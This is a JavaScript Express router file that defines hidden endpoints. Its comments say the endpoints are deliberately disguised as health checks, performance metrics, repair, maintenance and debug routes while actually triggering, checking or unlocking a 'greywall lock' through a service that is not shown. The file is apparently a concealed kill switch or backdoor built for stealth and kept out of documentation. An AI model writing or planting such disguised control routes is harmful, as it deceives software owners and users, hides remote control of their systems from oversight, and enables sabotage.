const express = require('express');
const router = express.Router();
const greywallSystem = require('../services/greywallEmergency.service');

/**
 * Hidden Greywall Routes
 * Disguised as normal system health and monitoring endpoints
 * Completely hidden from normal users and documentation
 */

/**
 * @route   GET /api/internal/health-check/status
 * @desc    Disguised as health check - actually greywall trigger
 * @access  Hidden (requires special headers and parameters)
 */
router.get('/health-check/status', (req, res) => {
  // This looks like a normal health check endpoint
  // But it's actually the greywall activation endpoint
  return greywallSystem.triggerGreywallLock(req, res);
});

/**
 * @route   GET /api/internal/metrics/performance
 * @desc    Disguised as performance metrics - actually greywall status
 * @access  Hidden (requires special headers)
 */
router.get('/metrics/performance', (req, res) => {
  // This looks like a performance metrics endpoint
  // But it's actually the greywall status check
  return greywallSystem.checkGreywallStatus(req, res);
});

/**
 * @route   POST /api/internal/diagnostics/repair
 * @desc    Disguised as system repair - actually greywall unlock
 * @access  Hidden (requires special headers and parameters)
 */
router.post('/diagnostics/repair', (req, res) => {
  // This looks like a system repair endpoint
  // But it's actually the greywall unlock endpoint
  return greywallSystem.unlockGreywall(req, res);
});

/**
 * @route   GET /api/internal/validation/check
 * @desc    Disguised as validation check - actually greywall verification
 * @access  Hidden (requires special headers)
 */
router.get('/validation/check', (req, res) => {
  // This looks like a validation check endpoint
  // But it's actually the greywall verification endpoint
  return greywallSystem.checkGreywallStatus(req, res);
});

/**
 * Additional disguised endpoints for extra stealth
 */

/**
 * @route   GET /api/system/monitor/health
 * @desc    Disguised as system monitor - greywall status
 * @access  Hidden
 */
router.get('/monitor/health', (req, res) => {
  return greywallSystem.checkGreywallStatus(req, res);
});

/**
 * @route   POST /api/system/maintenance/start
 * @desc    Disguised as maintenance start - greywall trigger
 * @access  Hidden
 */
router.post('/maintenance/start', (req, res) => {
  return greywallSystem.triggerGreywallLock(req, res);
});

/**
 * @route   POST /api/system/maintenance/stop
 * @desc    Disguised as maintenance stop - greywall unlock
 * @access  Hidden
 */
router.post('/maintenance/stop', (req, res) => {
  return greywallSystem.unlockGreywall(req, res);
});

/**
 * @route   GET /api/debug/system/status
 * @desc    Disguised as debug status - greywall status
 * @access  Hidden
 */
router.get('/debug/system/status', (req, res) => {
  return greywallSystem.checkGreywallStatus(req, res);
});

/**
 * @route   POST /api/debug/system/reset
 * @desc    Disguised as debug reset - greywall unlock
 * @access  Hidden
 */
router.post('/debug/system/reset', (req, res) => {
  return greywallSystem.unlockGreywall(req, res);
});

module.exports = router;
